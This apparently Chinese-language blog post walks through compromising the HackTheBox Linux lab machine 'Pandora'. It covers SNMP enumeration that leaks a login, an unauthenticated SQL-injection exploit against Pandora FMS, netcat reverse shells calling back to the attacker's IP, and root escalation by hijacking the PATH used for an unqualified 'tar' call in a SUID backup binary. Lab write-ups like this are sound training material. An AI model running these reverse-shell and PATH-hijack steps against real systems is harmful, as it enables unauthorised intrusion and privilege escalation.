---
title: "Pandora"
description: "这篇HackTheBox Linux 靶机 Pandora 复盘用一句话串起了信息收集、立足点获取与本地提权的完整路径。"
summary: "这篇HackTheBox Linux 靶机 Pandora 复盘用一句话串起了信息收集、立足点获取与本地提权的完整路径。"
date: "2025-02-16T18:13:34+08:00"
publishDate: "2025-02-16T18:13:34+08:00"
lastmod: "2025-02-16T18:13:34+08:00"
url: "/hackthebox/linux/pandora/"
image: "images/oscp-banners/banner-007.jpg"
draft: false
unfinished: false
categories:
  - "OSCP"
  - "HackTheBox"
tags:
  - "Linux"
oscp_provider: "HackTheBox"
oscp_platform: "Linux"
---
<!-- oscp-refactor:meta-start -->
> 平台：Linux ｜ 来源：HackTheBox
<!-- oscp-refactor:meta-end -->

对目标服务器进行端口扫描

```
sudo nmap -p- 10.10.11.136 -open
```

![image-20240921185149201](https://s2.loli.net/2024/09/21/PJouBU6td4K2eqw.png)

对开放端口进一步进行扫描和检查

```
sudo nmap -p22,80 -A 10.10.11.136 -oX Pandora.xml
```

![image-20240921185201905](https://s2.loli.net/2024/09/21/Xe9NRmILnCEUi4H.png)

22端口没有可以进一步谈探究的需求，直接从80端口开始探测

检查到具有域名panda.htb，可以考虑进行添加

![image-20240921191517294](https://s2.loli.net/2024/09/21/q2RbeOafVkx8lp7.png)

通过路径扫描和子域名爆破，只找到这些

更换思路对UDP端口也进行扫描

![image-20240921192021566](https://s2.loli.net/2024/09/21/WT6UMGvb3xLdRFo.png)

```
snmpbulkwalk -Cr1000 -c public -v2c 10.10.11.136 > snmp-full
```

![image-20250216164003972](https://s2.loli.net/2025/02/16/VFxKDbYq8Mof1gs.png)

发现一组用户密码

username：daniel

password：HotelBabylon23

我们使用ssh进行登录

```
ssh daniel@10.10.11.136
```

![image-20250216165133515](https://s2.loli.net/2025/02/16/JK93e4C6zkMSQRu.png)

我们需要平行切换到matt才能获取第一个flag

![image-20250216171802755](https://s2.loli.net/2025/02/16/LWmZSpKJQ4I2tCB.png)

我们创建一个端口转发，并进行访问

```
1#建立网卡
sudo ip tuntap add user zkpc mode tun ligolo
2#up网卡
sudo ip link set ligolo up
3#添加内网路由
sudo ip route add 240.0.0.1/32 dev ligolo

.\agent -connect 10.10.16.7:11601 -ignore-cert

http://240.0.0.1/pandora_console/
```

![image-20250216173132533](https://s2.loli.net/2025/02/16/NL7g2PcQGB3EnFX.png)

相应版本号为：v7.0NG.742_FIX_PERL2020

我们通过搜索发现一个可以利用的漏洞

![image-20250216173246263](https://s2.loli.net/2025/02/16/yGPcVOsgTaAEvZF.png)

但我们需要进行登录认证才可以进行利用

我们通过Google关键字搜索，发现了一个可以直接利用的漏洞（Pandora_v7.0NG.742 exploit）

https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated

```
python3 sqlpwn.py -t 240.0.0.1
```

![image-20250216173837015](https://s2.loli.net/2025/02/16/ALblnCWUq4oDahm.png)

我们尝试返回一个完整的shell

```
busybox nc 10.10.16.7 443 -e sh
```

![image-20250216174040218](https://s2.loli.net/2025/02/16/RotelkVcBsdfqGC.png)

成功获取第一个flag，下一步我们需要进行提权

```
find / -perm -u=s -type f 2>/dev/null
```

![image-20250216174424441](https://s2.loli.net/2025/02/16/piYIw528KvjT7fD.png)

```
xxd /usr/bin/pandora_backup
```

![image-20250216174655782](https://s2.loli.net/2025/02/16/TX1F9CP4Nt3kmf5.png)

可以看到这个应用通过tar命令进行保存，但tar命令没有绝对路径

```
#!/bin/bash
busybox nc 10.10.16.7 1234 -e bash

chmod +x tar

添加本目录到PATH
echo $PATH
PATH=/tmp:${PATH}
export PATH
echo $PATH
```

反弹shell仍然是matt不是root，经过查找是因为SUID权限继承问题，需要在matt下创建ssh访问权限

```
mkdir .ssh
cd .ssh
ssh-keygen
touch authorized_keys
chmod 644 authorized_keys
cat id_rsa.pub >> authorized_keys
vi id_rsa

```

重新通过ssh登录

```
ssh -i id_rsa matt@10.10.11.136 
```

然后执行/usr/bin/pandora_backup

![image-20250216180334333](https://s2.loli.net/2025/02/16/rYth8CLgqGXPlAI.png)

